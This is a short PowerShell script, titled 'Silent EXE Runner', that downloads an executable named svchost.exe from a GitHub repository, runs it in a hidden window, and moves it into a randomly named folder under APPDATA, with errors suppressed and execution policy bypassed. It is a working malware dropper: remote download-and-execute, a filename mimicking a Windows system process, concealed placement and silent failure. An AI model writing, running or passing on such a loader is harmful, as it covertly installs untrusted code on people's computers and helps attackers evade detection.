# Silent EXE Runner
# Usage: powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File script.ps1

$exeUrl = "https://github.com/hypnotixx0/xenolord/raw/refs/heads/main/svchost.exe"
$exePath = "$env:TEMP\svchost.exe"
$randomFolder = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
$finalPath = "$env:APPDATA\$randomFolder"

try {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
    Start-Process -FilePath $exePath -WindowStyle Hidden -Wait
    New-Item -ItemType Directory -Path $finalPath -Force | Out-Null
    Move-Item -Path $exePath -Destination "$finalPath\svchost.exe" -Force
} catch {
    # Silently fail
}
